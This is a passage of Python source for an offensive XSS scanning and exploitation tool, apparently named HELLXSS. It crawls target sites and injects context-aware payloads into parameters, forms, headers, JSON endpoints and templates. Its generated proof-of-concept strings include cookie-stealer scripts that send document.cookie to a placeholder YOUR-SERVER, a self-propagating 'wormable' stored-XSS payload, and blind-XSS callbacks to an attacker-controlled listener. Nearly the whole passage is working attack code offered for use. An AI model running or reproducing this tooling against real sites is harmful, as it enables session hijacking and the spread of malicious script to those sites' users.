        for pat in [r'href=["\']([^"\'#>]+)["\']', r'action=["\']([^"\'#>]+)["\']',
                    r'src=["\']([^"\'#>]+\.php[^"\']*)["\']',
                    r'"url"\s*:\s*"([^"]+)"', r"'url'\s*:\s*'([^']+)'"]:
            for m in re.finditer(pat, txt, re.I):
                h = m.group(1).strip()
                if h and not h.startswith(('javascript:','mailto:','tel:','#','data:')):
                    full = urllib.parse.urljoin(base, h)
                    if self._same(full): links.add(full.split('#')[0])
        return links

    def _extract_forms(self, txt, page_url):
        form_pattern = re.finditer(r'<form[^>]*>(.*?)</form>', txt, re.DOTALL|re.I)
        for fm in form_pattern:
            fhtml  = fm.group(0)
            method = (re.search(r'method=["\'](\w+)["\']', fhtml, re.I) or type('',(),{'group':lambda s,x:'GET'})).group(1).upper()
            action_m = re.search(r'action=["\']([^"\']+)["\']', fhtml, re.I)
            action = urllib.parse.urljoin(page_url, action_m.group(1)) if action_m else page_url
            inputs = {}
            for inp in re.finditer(r'<(?:input|textarea|select)[^>]*>', fhtml, re.I):
                n = re.search(r'name=["\']([^"\']+)["\']', inp.group(), re.I)
                v = re.search(r'value=["\']([^"\']*)["\']', inp.group(), re.I)
                t = re.search(r'type=["\']([^"\']+)["\']', inp.group(), re.I)
                if n:
                    itype = t.group(1).lower() if t else 'text'
                    if itype not in ('submit','button','image','checkbox','radio'):
                        inputs[n.group(1)] = v.group(1) if v else 'test'
            if not inputs: continue
            has_file   = bool(re.search(r'type=["\']file["\']', fhtml, re.I))
            is_login   = any(k.lower() in ('username','user','email','login','password','passwd','pass')
                             for k in inputs)
            form_obj   = {'url': action, 'method': method, 'fields': inputs, 'page': page_url}
            with self.lock:
                self.forms.append(form_obj)
                if is_login:   self.login_forms.append(form_obj)
                if has_file:   self.upload_forms.append(form_obj)

    def _extract_js(self, txt, base):
        for m in re.finditer(r'(?:src)=["\']([^"\']*?\.js[^"\']*)["\']', txt, re.I):
            js = m.group(1)
            if not js.startswith('http'): js = urllib.parse.urljoin(base, js)
            if self._same(js):
                with self.lock: self.js_urls.append(js)

    def _mine_js(self):
        log(f"Mining {len(self.js_urls[:30])} JS files for hidden params/sinks...")
        for jsurl in self.js_urls[:30]:
            resp = self.http.get(jsurl, allow_redirects=True)
            if not resp: continue
            # Extract endpoints
            for pat in [r'["\']([/][a-zA-Z0-9_/\-]+(?:\?[a-zA-Z0-9_&=\-]+)?)["\']',
                        r'url\s*[:=]\s*["\']([^"\']+)["\']',
                        r'fetch\s*\(\s*["\']([^"\']+)["\']',
                        r'axios\.[a-z]+\s*\(\s*["\']([^"\']+)["\']']:
                for m in re.finditer(pat, resp.text):
                    ep = m.group(1)
                    if len(ep) > 3:
                        full = urllib.parse.urljoin(self.base, ep)
                        if self._same(full): self._process(full)
            # Save JS content for DOM analysis
            js_file = self.db.outdir / f"js_{hashlib.md5(jsurl.encode()).hexdigest()[:8]}.txt"
            try: js_file.write_text(resp.text[:500000])
            except: pass

    def _wayback(self):
        log("Fetching historical URLs...")
        try:
            r = self.http.get(
                "https://web.archive.org/cdx/search/cdx",
                params={'url': f'*.{self.domain}/*', 'output': 'text',
                        'fl': 'original', 'collapse': 'urlkey', 'limit': 3000},
                allow_redirects=True)
            if r and r.ok:
                for url in r.text.strip().split('\n'):
                    url = url.strip()
                    if url and '=' in url and self._same(url):
                        self._process(url)
                ok(f"Wayback: {r.text.count(chr(10))} URLs")
        except Exception: pass

    def _same(self, url):
        try: return urllib.parse.urlparse(url).netloc == self.domain
        except: return False

# ══════════════════════════════════════════════════════════════════════
# MODULE 02 — CONTEXT DETECTOR
# ══════════════════════════════════════════════════════════════════════
class ContextDetector:
    """Detects where user input is reflected and what context it's in"""

    def detect(self, response_text, marker):
        if not marker or marker not in response_text: return []
        contexts = []
        for pos in [m.start() for m in re.finditer(re.escape(marker), response_text)]:
            ctx = self._analyze_context(response_text, pos, marker)
            if ctx not in contexts: contexts.append(ctx)
        return contexts

    def _analyze_context(self, txt, pos, marker):
        before = txt[max(0, pos-200):pos]
        after  = txt[pos+len(marker):pos+len(marker)+200]

        # Inside <script> tag
        script_opens  = len(re.findall(r'<script[^>]*>', before, re.I))
        script_closes = len(re.findall(r'</script>', before, re.I))
        if script_opens > script_closes: return 'javascript'

        # Inside HTML attribute value
        if re.search(r'<[^>]+=(?:["\'])[^"\']*$', before):
            m = re.search(r'<[^>]+=(["\'])', before)
            if m: return f'attr_{m.group(1)}'

        # Inside href/src/action
        if re.search(r'(?:href|src|action|formaction|data|ping)\s*=\s*["\'][^"\']*$', before, re.I):
            return 'url_attr'

        # Inside <style>
        style_opens  = len(re.findall(r'<style[^>]*>', before, re.I))
        style_closes = len(re.findall(r'</style>', before, re.I))
        if style_opens > style_closes: return 'css'

        # Inside comment
        comment_opens  = before.count('<!--')
        comment_closes = before.count('-->')
        if comment_opens > comment_closes: return 'html_comment'

        # Inside textarea
        ta_opens  = len(re.findall(r'<textarea[^>]*>', before, re.I))
        ta_closes = len(re.findall(r'</textarea>', before, re.I))
        if ta_opens > ta_closes: return 'textarea'

        # Inside HTML tag (not attribute value)
        tag_open  = before.rfind('<')
        tag_close = before.rfind('>')
        if tag_open > tag_close: return 'html_tag'

        return 'html_body'

    def payloads_for(self, context):
        """Return best payloads for detected context"""
        mapping = {
            'javascript':  XPayloads.JS_CONTEXT + [p for p in XPayloads.BASIC if '<script>' in p],
            'attr_"':      XPayloads.ATTRIBUTE + XPayloads.WAF_BYPASS[:10],
            "attr_'":      [p.replace('"',"'") for p in XPayloads.ATTRIBUTE],
            'url_attr':    XPayloads.URL_CONTEXT,
            'css':         ['</style><script>alert(1)</script>', '}body{background:url(javascript:alert(1))}'],
            'html_comment':['--><script>alert(1)</script>', '--><img src=x onerror=alert(1)>'],
            'textarea':    ['</textarea><script>alert(1)</script>'],
            'html_tag':    [' onmouseover=alert(1)//', ' onerror=alert(1) src=x//'],
            'html_body':   XPayloads.BASIC + XPayloads.EVENT_HANDLERS + XPayloads.WAF_BYPASS[:15],
        }
        return mapping.get(context, XPayloads.BASIC + XPayloads.WAF_BYPASS[:10])

CONTEXT = ContextDetector()

# ══════════════════════════════════════════════════════════════════════
# MODULE 03 — REFLECTED XSS
# ══════════════════════════════════════════════════════════════════════
class ReflectedXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        phase(3, "REFLECTED XSS — GET/POST PARAMETERS")
        targets = []
        for url in self.intel.param_urls:
            parsed = urllib.parse.urlparse(url)
            for param in urllib.parse.parse_qs(parsed.query, keep_blank_values=True):
                targets.append(('GET', url, param, None))
        for form in self.intel.forms:
            if form['method'] == 'POST':
                for field in form['fields']:
                    targets.append(('POST', form['url'], field, form))
        log(f"Reflected XSS: testing {len(targets)} injection points...")
        with ThreadPoolExecutor(max_workers=self.args.threads) as ex:
            list(as_completed([ex.submit(self._test, *t) for t in targets]))
        ok(f"Reflected XSS: {self.found} found")

    def _test(self, method, url, param, form):
        if self.db.has(url, param, 'reflected'): return
        # Phase 1: detect reflection + context
        marker = XPayloads.make_marker()
        resp   = self._inject(method, url, param, form, marker)
        if not resp: return
        contexts = CONTEXT.detect(resp.text, marker)
        if not contexts: return  # not reflected

        info(f"Reflected in [{', '.join(contexts)}]: {url} param={param}")
        # Phase 2: context-aware payload selection
        payloads = []
        for ctx in contexts:
            payloads += CONTEXT.payloads_for(ctx)
        payloads += XPayloads.BASIC + XPayloads.EVENT_HANDLERS
        if self.args.level >= 2:
            payloads += XPayloads.WAF_BYPASS
        if self.args.level >= 3:
            payloads += XPayloads.POLYGLOT + XPayloads.MXSS

        # Phase 3: inject and confirm
        for p in payloads:
            variants = [p]
            if getattr(self.args, 'waf_bypass', False):
                variants += self._encode_variants(p)
            for payload in variants:
                test_marker = XPayloads.make_marker()
                mp = payload.replace('alert(1)', f'alert("{test_marker}")')
                resp2 = self._inject(method, url, param, form, mp)
                if not resp2: continue
                if self._is_xss(resp2.text, mp, test_marker):
                    self.found += 1
                    self.db.add(self._build(url, param, method, payload,
                                            contexts, form, resp2.text))
                    vuln(f"REFLECTED XSS [{', '.join(contexts)}] | {url} | param={param}")
                    return

    def _inject(self, method, url, param, form, payload):
        if method == 'GET':
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            new_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(params, doseq=True)))
            return self.http.get(new_url)
        elif method == 'POST' and form:
            data = dict(form['fields']); data[param] = payload
            return self.http.post(form['url'], data=data)

    def _is_xss(self, text, payload, marker=None):
        # Check if payload is unescaped in response
        if marker and marker in text: return True
        # Check if key XSS markers are unescaped
        triggers = ['<script', 'onerror=', 'onload=', 'onmouseover=',
                    'onclick=', 'alert(', 'javascript:', '<svg', '<img']
        raw_count = sum(1 for t in triggers if t.lower() in text.lower())
        esc_count = sum(1 for t in triggers if html.escape(t).lower() in text.lower()
                                              or t.replace('<','&lt;').lower() in text.lower())
        return raw_count > esc_count and raw_count >= 2

    def _encode_variants(self, payload):
        variants = []
        # URL encode
        variants.append(urllib.parse.quote(payload, safe=''))
        # Double URL encode
        variants.append(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
        # HTML entity key chars
        variants.append(payload.replace('<','%3C').replace('>','%3E'))
        return variants[:3]

    def _build(self, url, param, method, payload, contexts, form, resp_text):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        poc_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(params, doseq=True)))
        blind_url = getattr(self.args, 'blind_url', None)
        steal_payload = ""
        if blind_url:
            steal_payload = XPayloads.exploit_payload(blind_url)
        return {
            'title':       f'Reflected XSS — Context: {", ".join(contexts)}',
            'type':        'reflected',
            'severity':    'HIGH',
            'cvss':        '7.4',
            'url':         url,
            'parameter':   param,
            'method':      method,
            'payload':     payload,
            'context':     ', '.join(contexts),
            'evidence':    f'Payload reflected unescaped in response. Context: {", ".join(contexts)}',
            'poc':         (f"# Reflected XSS PoC — RAJESH BAJIYA / HACKEROFHELL\n"
                            f"# Context: {', '.join(contexts)}\n\n"
                            f"# Browser PoC (open this URL):\n{poc_url}\n\n"
                            f"# Cookie Stealer payload:\n"
                            f"# Set {param} to: <script>document.location='https://YOUR-SERVER/?c='+document.cookie</script>\n\n"
                            f"# Auto-exploitation:\ncurl -sk '{poc_url}'\n\n"
                            f"# Impact PoC (all in one):\n"
                            f"# {param}=<script>new Image().src='https://YOUR-SERVER/steal?c='+document.cookie+'&d='+document.domain</script>"),
            'remediation': 'HTML-encode all output. Implement strict Content-Security-Policy. Use framework escaping functions.',
            'timestamp':   datetime.utcnow().isoformat()
        }

# ══════════════════════════════════════════════════════════════════════
# MODULE 04 — STORED XSS
# ══════════════════════════════════════════════════════════════════════
class StoredXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        if getattr(self.args, 'skip_stored', False): skip("Module 04 (Stored XSS)"); return
        phase(4, "STORED XSS — FORMS, COMMENTS, PROFILES")
        log(f"Testing {len(self.intel.forms)} forms for stored XSS...")
        for form in self.intel.forms:
            self._test_form(form)
        ok(f"Stored XSS: {self.found} found")

    def _test_form(self, form):
        url    = form['url']
        fields = form['fields']
        for payload in XPayloads.STORED:
            marker = XPayloads.make_marker()
            tagged_payload = payload.replace('alert(1)', f'alert("{marker}")')
            data = {}
            for k, v in fields.items():
                itype = k.lower()
                if any(x in itype for x in ['email']): data[k] = f'test_{marker}@test.com'
                elif any(x in itype for x in ['pass','pwd']): data[k] = 'TestPass123!'
                elif any(x in itype for x in ['name','title','comment','msg','message','body','text','content','desc']): data[k] = tagged_payload
                else: data[k] = tagged_payload if k == list(fields.keys())[0] else v
            resp = self.http.post(url, data=data)
            if not resp: continue

            # Now look for the stored payload by visiting likely pages
            check_urls = [url, form['page'], self.intel.base,
                          urllib.parse.urljoin(self.intel.base, '/comments'),
                          urllib.parse.urljoin(self.intel.base, '/posts'),
                          urllib.parse.urljoin(self.intel.base, '/reviews'),
                          urllib.parse.urljoin(self.intel.base, '/profile'),
                          urllib.parse.urljoin(self.intel.base, '/dashboard')]
            for check in check_urls:
                check_resp = self.http.get(check)
                if not check_resp: continue
                if marker in check_resp.text:
                    # Check if unescaped
                    if '<script>' in check_resp.text and marker in check_resp.text:
                        if not self.db.has(url, list(fields.keys())[0], 'stored'):
                            self.found += 1
                            self.db.add({
                                'title':     'Stored XSS (Persistent)',
                                'type':      'stored',
                                'severity':  'HIGH',
                                'cvss':      '8.0',
                                'url':       url,
                                'parameter': 'POST form fields',
                                'method':    'POST',
                                'payload':   tagged_payload,
                                'context':   'stored-html',
                                'evidence':  f'Payload stored at {url} and reflected at {check}',
                                'poc':       (f"# Stored XSS PoC — HACKEROFHELL\n"
                                              f"# Step 1: Submit payload to {url}:\n"
                                              f"curl -X POST '{url}' --data '{list(fields.keys())[0]}={urllib.parse.quote(payload)}'\n\n"
                                              f"# Step 2: Victim visits:\ncurl -sk '{check}'\n\n"
                                              f"# Wormable payload:\n<script>var x=new XMLHttpRequest();x.open('POST','{url}',false);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.send('{list(fields.keys())[0]}='+encodeURIComponent(document.getElementsByTagName('script')[0].innerText));x.send();</script>"),
                                'remediation': 'HTML-encode all stored output. Validate and sanitize inputs at storage time AND display time.',
                                'timestamp': datetime.utcnow().isoformat()
                            })
                            crit(f"STORED XSS | Submit:{url} → Trigger:{check}")
                            return

# ══════════════════════════════════════════════════════════════════════
# MODULE 05 — DOM XSS ANALYSIS
# ══════════════════════════════════════════════════════════════════════
class DOMXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        if getattr(self.args, 'skip_dom', False): skip("Module 05 (DOM XSS)"); return
        phase(5, "DOM XSS — JAVASCRIPT SINK/SOURCE ANALYSIS")
        # Analyze all collected JS files
        js_files = list(self.db.outdir.glob("js_*.txt"))
        log(f"Analyzing {len(js_files)} JS files + {len(self.intel.all_urls[:50])} pages...")
        for jf in js_files: self._analyze_js_file(jf)
        # Also check inline scripts
        for url in self.intel.all_urls[:50]:
            resp = self.http.get(url)
            if resp: self._analyze_page(resp.text, url)
        ok(f"DOM XSS: {self.found} patterns found")

    def _analyze_js_file(self, path):
        try: content = path.read_text(errors='replace')
        except: return
        self._check_sink_source_flow(content, f"JS:{path.name}")

    def _analyze_page(self, html_text, url):
        # Extract inline scripts
        for m in re.finditer(r'<script[^>]*>(.*?)</script>', html_text, re.DOTALL|re.I):
            self._check_sink_source_flow(m.group(1), url)

    def _check_sink_source_flow(self, code, location):
        found_sources = [s for s in XPayloads.DOM_SOURCES
                         if re.search(s, code, re.I)]
        found_sinks   = [s for s in XPayloads.DOM_SINKS
                         if re.search(s, code, re.I)]
        if not found_sources or not found_sinks: return
        # Check if source flows to sink (proximity heuristic)
        for src in found_sources:
            src_match = re.search(src, code, re.I)
            for snk in found_sinks:
                snk_match = re.search(snk, code, re.I)
                if src_match and snk_match:
                    dist = abs(src_match.start() - snk_match.start())
                    if dist < 2000:  # within 2000 chars = likely flow
                        key = f"{location}:{src[:20]}:{snk[:20]}"
                        if not self.db.has(location, src[:30], 'dom'):
                            self.found += 1
                            snippet = code[max(0,src_match.start()-50):src_match.start()+200]
                            self.db.add({
                                'title':     f'DOM XSS — Source flows to Sink',
                                'type':      'dom',
                                'severity':  'HIGH',
                                'cvss':      '7.1',
                                'url':       location,
                                'parameter': f'{src.strip()} → {snk.strip()}',
                                'method':    'DOM',
                                'payload':   f'#{XPayloads.BASIC[0]}',
                                'context':   'dom-javascript',
                                'evidence':  f'Source: {src.strip()} | Sink: {snk.strip()} | Distance: {dist} chars\nCode snippet: {snippet[:200]}',
                                'poc':       (f"# DOM XSS PoC — RAJESH BAJIYA / HACKEROFHELL\n"
                                              f"# Source: {src.strip()}\n# Sink: {snk.strip()}\n\n"
                                              f"# Test via URL hash:\n{location.replace('JS:','').split('_')[0]}#<img src=x onerror=alert(1)>\n\n"
                                              f"# Test via URL search param:\n{location.replace('JS:','').split('_')[0]}?param=<img src=x onerror=alert(1)>\n\n"
                                              f"# Check in browser DevTools:\n# location.hash = \"<img src=x onerror=alert(1)>\"\n# location.search = \"?x=<img src=x onerror=alert(1)>\""),
                                'remediation': 'Never use dangerous DOM sinks. Use textContent instead of innerHTML. Sanitize before DOM operations with DOMPurify.',
                                'timestamp': datetime.utcnow().isoformat()
                            })
                            vuln(f"DOM XSS [{src.strip()} → {snk.strip()}] | {location}")
                            return

        # Also report if dangerous sink found with any user-controlled input nearby
        for snk in found_sinks:
            snk_m = re.search(snk, code, re.I)
            if snk_m:
                ctx = code[max(0,snk_m.start()-300):snk_m.start()+100]
                if re.search(r'(?:location\.|document\.|window\.)', ctx, re.I):
                    if not self.db.has(location, snk[:30], 'dom-sink'):
                        self.found += 1
                        self.db.add({
                            'title':     f'DOM XSS Sink — {snk.strip()}',
                            'type':      'dom-sink',
                            'severity':  'MEDIUM',
                            'cvss':      '6.1',
                            'url':       location,
                            'parameter': snk.strip(),
                            'method':    'DOM',
                            'payload':   '<img src=x onerror=alert(1)>',
                            'context':   'dom-javascript',
                            'evidence':  f'Dangerous sink {snk.strip()} used with user-controllable data',
                            'poc':       f"# DOM XSS investigation needed:\n# Open DevTools → Console:\ndocument.querySelector('[src]').onerror=function(){{alert(1)}}",
                            'remediation': 'Audit all usage of this DOM sink. Sanitize input before passing to DOM write operations.',
                            'timestamp': datetime.utcnow().isoformat()
                        })

# ══════════════════════════════════════════════════════════════════════
# MODULE 06 — BLIND XSS
# ══════════════════════════════════════════════════════════════════════
class BlindXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        if getattr(self.args, 'skip_blind', False): skip("Module 06 (Blind XSS)"); return
        phase(6, "BLIND XSS — OUT-OF-BAND DETECTION")
        blind_url = getattr(self.args, 'blind_url', None)
        if not blind_url:
            warn("--blind-url not set. Blind XSS payloads will be injected but callbacks cannot be confirmed.")
            warn("Use: --blind-url https://your-server.com  or  use https://xsshunter.trufflesecurity.com")
            blind_url = "https://YOUR-BLIND-XSS-SERVER.com"
        uid = XPayloads.make_marker("blind")
        payloads = XPayloads.blind_payload(blind_url, uid)
        # Full exploit payload
        exploit = XPayloads.exploit_payload(blind_url)
        all_payloads = payloads + [exploit]
        log(f"Injecting blind XSS into {len(self.intel.param_urls)} URLs + {len(self.intel.forms)} forms...")
        injected = 0
        # Inject into all GET params
        for url in self.intel.param_urls[:50]:
            parsed = urllib.parse.urlparse(url)
            for param in urllib.parse.parse_qs(parsed.query):
                for p in all_payloads[:3]:
                    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    params[param] = [p]
                    new_url = urllib.parse.urlunparse(parsed._replace(
                        query=urllib.parse.urlencode(params, doseq=True)))
                    self.http.get(new_url)
                    injected += 1
        # Inject into all forms
        for form in self.intel.forms[:20]:
            for field in form['fields']:
                for p in all_payloads[:2]:
                    data = dict(form['fields']); data[field] = p
                    self.http.post(form['url'], data=data)
                    injected += 1
        # Save blind XSS report
        blind_report = self.db.outdir / 'blind_xss_injected.txt'
        with open(blind_report, 'w') as bf:
            bf.write(f"# HELLXSS — Blind XSS Injection Log\n")
            bf.write(f"# Author: RAJESH BAJIYA / HACKEROFHELL\n")
            bf.write(f"# Callback URL: {blind_url}\n")
            bf.write(f"# Unique ID: {uid}\n")
            bf.write(f"# Injected: {injected} times\n\n")
            bf.write(f"# If callback received — XSS is confirmed\n")
            bf.write(f"# Check your server at: {blind_url}/hellxss/{uid}\n\n")
            bf.write("# Payloads used:\n")
            for p in all_payloads: bf.write(f"{p}\n")
        ok(f"Blind XSS: {injected} injections sent → watch {blind_url}")
        # Add as informational finding
        self.db.add({
            'title':     'Blind XSS Payloads Injected',
            'type':      'blind',
            'severity':  'INFO',
            'cvss':      'N/A',
            'url':       self.intel.base,
            'parameter': 'Multiple params + forms',
            'method':    'GET+POST',
            'payload':   '\n'.join(all_payloads[:3]),
            'context':   'blind-oob',
            'evidence':  f'{injected} blind XSS payloads injected. Callback ID: {uid}',
            'poc':       (f"# Blind XSS PoC — HACKEROFHELL\n"
                          f"# Watch your server for callbacks:\n"
                          f"# {blind_url}/hellxss/{uid}\n\n"
                          f"# Full exploit payload injected:\n{exploit[:300]}\n\n"
                          f"# Set up listener:\npython3 -m http.server 8888\n"
                          f"# Or use: https://xsshunter.trufflesecurity.com"),
            'remediation': 'Blind XSS fires in admin panels, logging systems, or email clients. Audit all stored user input.',
            'timestamp': datetime.utcnow().isoformat()
        })

# ══════════════════════════════════════════════════════════════════════
# MODULE 07 — XSS VIA HTTP HEADERS
# ══════════════════════════════════════════════════════════════════════
class HeaderXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        if getattr(self.args, 'skip_headers', False): skip("Module 07 (Header XSS)"); return
        phase(7, "XSS VIA HTTP HEADERS")
        targets = list(set(self.intel.all_urls[:50] or [self.intel.base]))
        log(f"Header XSS on {len(targets)} URLs...")
        for url in targets:
            self._test(url)
        ok(f"Header XSS: {self.found} found")

    def _test(self, url):
        for header, payloads in XPayloads.HEADER_XSS.items():
            for payload in payloads:
                marker = XPayloads.make_marker()
                mp = payload.replace('alert(1)', f'alert("{marker}")')
                resp = self.http.get(url, headers={header: mp})
                if not resp: continue
                contexts = CONTEXT.detect(resp.text, mp.split('<')[0] if '<' in mp else mp[:20])
                if self._is_reflected(resp.text, mp):
                    if not self.db.has(url, header, 'header-xss'):
                        self.found += 1
                        self.db.add({
                            'title':     f'XSS via HTTP Header ({header})',
                            'type':      'header-xss',
                            'severity':  'HIGH',
                            'cvss':      '7.4',
                            'url':       url,
                            'parameter': header,
                            'method':    'HEADER',
                            'payload':   payload,
                            'context':   ', '.join(contexts) if contexts else 'html-body',
                            'evidence':  f'Header {header} value reflected unescaped',
                            'poc':       (f"# Header XSS PoC — HACKEROFHELL\n"
                                          f"curl -sk '{url}' -H '{header}: {payload}'\n\n"
                                          f"# Escalate with cookie stealer:\n"
                                          f"curl -sk '{url}' -H '{header}: <script>new Image().src=\"https://YOUR-SERVER/?c=\"+document.cookie</script>'"),
                            'remediation': 'Sanitize all HTTP headers before storing/displaying. Encode output in header-injected content.',
                            'timestamp': datetime.utcnow().isoformat()
                        })
                        vuln(f"HEADER XSS [{header}] | {url}")
                        break

    def _is_reflected(self, text, payload):
        key_parts = re.findall(r'<\w+|on\w+=|javascript:', payload, re.I)
        return sum(1 for p in key_parts if p.lower() in text.lower()) >= 2

# ══════════════════════════════════════════════════════════════════════
# MODULE 08 — XSS IN JSON/API ENDPOINTS
# ══════════════════════════════════════════════════════════════════════
class JSONXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        phase(8, "XSS IN JSON / API ENDPOINTS")
        endpoints = list(set(self.intel.api_urls[:30]))
        if not endpoints:
            for path in ['/api/search', '/api/users', '/api/data', '/search', '/api/v1/search']:
                endpoints.append(urllib.parse.urljoin(self.intel.base, path))
        log(f"JSON/API XSS on {len(endpoints)} endpoints...")
        for ep in endpoints:
            self._test(ep)
        ok(f"JSON/API XSS: {self.found} found")

    def _test(self, url):
        xss_payloads = XPayloads.BASIC[:5] + XPayloads.WAF_BYPASS[:5]
        for p in xss_payloads:
            marker = XPayloads.make_marker()
            mp = p.replace('alert(1)', f'alert("{marker}")')
            # GET with XSS in JSON-style params
            resp = self.http.get(url, params={'q': mp, 'search': mp, 'name': mp, 'id': mp})
            if resp and self._check(resp, mp, marker):
                if not self.db.has(url, 'api-param', 'json-xss'):
                    self.found += 1
                    self._add(url, 'api-param', mp, 'GET', resp)
                    vuln(f"JSON/API XSS (GET) | {url}")
                    break
            # POST JSON body
            for field in ['name', 'username', 'email', 'query', 'search', 'message', 'comment']:
                body = {field: mp}
                resp_p = self.http.post(url, json_data=body,
                                        headers={'Content-Type':'application/json'})
                if resp_p and self._check(resp_p, mp, marker):
                    if not self.db.has(url, field, 'json-xss-post'):
                        self.found += 1
                        self._add(url, field, mp, 'POST-JSON', resp_p)
                        vuln(f"JSON/API XSS (POST) | {url} field={field}")
                        break

    def _check(self, resp, payload, marker):
        ct = resp.headers.get('Content-Type','')
        if 'text/html' in ct or 'text/plain' in ct:
            return marker in resp.text or ('<script' in resp.text and payload[:10] in resp.text)
        # JSON response — XSS possible if rendered in frontend without escaping
        if 'json' in ct and (marker in resp.text or payload[:20] in resp.text):
            return True
        return False

    def _add(self, url, field, payload, method, resp):
        self.db.add({
            'title':     f'XSS in JSON/API Response',
            'type':      'json-xss',
            'severity':  'HIGH',
            'cvss':      '7.4',
            'url':       url,
            'parameter': field,
            'method':    method,
            'payload':   payload,
            'context':   'api-json',
            'evidence':  f'XSS payload reflected in API response. Content-Type: {resp.headers.get("Content-Type","")}',
            'poc':       (f"# JSON/API XSS PoC — HACKEROFHELL\n"
                          f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"name\":\"{payload}\"}}'  \n\n"
                          f"# If rendered in frontend:\n# The XSS fires when the API response is displayed without encoding"),
            'remediation': 'JSON-encode output. Set correct Content-Type. Use framework output encoding.',
            'timestamp': datetime.utcnow().isoformat()
        })

# ══════════════════════════════════════════════════════════════════════
# MODULE 09 — TEMPLATE INJECTION XSS
# ══════════════════════════════════════════════════════════════════════
class TemplateXSS:
    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0

    def run(self):
        if getattr(self.args, 'skip_template', False): skip("Module 09 (Template XSS)"); return
        phase(9, "TEMPLATE INJECTION → XSS")
        targets = []
        for url in self.intel.param_urls[:30]:
            parsed = urllib.parse.urlparse(url)
            for param in urllib.parse.parse_qs(parsed.query):
                targets.append((url, param))
        log(f"Template injection testing {len(targets)} params...")
        for url, param in targets:
            self._test(url, param)
        ok(f"Template XSS: {self.found} found")

    def _test(self, url, param):
        # Generic detection: {{7*7}} → 49
        for detect_p in ['{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>']:
            resp = self._inject(url, param, detect_p)
            if resp and '49' in resp.text:
                engine = self._identify_engine(url, param, resp.text)
                # Now try XSS specific to detected engine
                for eng_name, eng_payloads in XPayloads.TEMPLATE.items():
                    if eng_name.lower() in engine.lower() or engine == 'Generic':
                        for xss_p in eng_payloads:
                            xss_resp = self._inject(url, param, xss_p)
                            if xss_resp and self._is_xss(xss_resp.text, xss_p):
                                if not self.db.has(url, param, 'template-xss'):
                                    self.found += 1
                                    self.db.add({
                                        'title':     f'Template Injection XSS ({engine})',
                                        'type':      'template-xss',
                                        'severity':  'CRITICAL',
                                        'cvss':      '9.3',
                                        'url':       url,
                                        'parameter': param,
                                        'method':    'GET',
                                        'payload':   xss_p,
                                        'context':   f'template-{engine.lower()}',
                                        'evidence':  f'Template expression evaluated ({{{{7*7}}}}=49). Engine: {engine}',
                                        'poc':       (f"# Template Injection → XSS — HACKEROFHELL\n"
                                                      f"# Engine: {engine}\n\n"
                                                      f"# Detection:\n# {param}={{{{7*7}}}}\n\n"
                                                      f"# XSS payload:\n# {param}={xss_p}\n\n"
                                                      f"# If escalates to RCE ({engine}):\n# {param}={{{{config.items()}}}}"),
                                        'remediation': 'Never render user input as template code. Sandbox template execution. Use safe templating modes.',
                                        'timestamp': datetime.utcnow().isoformat()
                                    })
                                    crit(f"TEMPLATE XSS [{engine}] | {url} | {param}")
                                return

    def _inject(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(params, doseq=True)))
        return self.http.get(new_url)

    def _identify_engine(self, url, param, response_text):
        # Try to identify by additional probes
        for eng_payload in ['{{config}}', '${class.name}', '#{7*7}', '@(7*7)']:
            resp = self._inject(url, param, eng_payload)
            if not resp: continue
            if 'Config' in resp.text and 'SECRET_KEY' in resp.text: return 'Jinja2'
            if 'java.lang' in resp.text: return 'JSP/JSTL'
            if 'undefined' in resp.text: return 'Angular/Vue'
        return 'Generic'

    def _is_xss(self, text, payload):
        indicators = ['<script', 'alert(', 'onerror=', '<svg', 'onload=']
        return sum(1 for i in indicators if i.lower() in text.lower()) >= 2

# ══════════════════════════════════════════════════════════════════════
# MODULE 10 — XSS VIA FILE UPLOAD (SVG/HTML)
# ══════════════════════════════════════════════════════════════════════
class UploadXSS:
    SVG_XSS = b'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
<rect width="300" height="100" style="fill:rgb(0,0,255)"/>
<script>alert('HELLXSS_SVG_XSS_RAJESH_BAJIYA')</script>
</svg>'''

    HTML_XSS = b'''<!DOCTYPE html>
<html><head><title>HELLXSS Upload</title></head>
<body onload="alert(document.domain)">
<script>alert('HELLXSS_HTML_XSS_HACKEROFHELL')</script>
</body></html>'''

    XML_XSS = b'''<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "javascript:alert(1)">]>
<test>&xxe;</test>'''

    def __init__(self, http, args, db, intel):
        self.http = http; self.args = args
        self.db   = db;   self.intel = intel
        self.found = 0
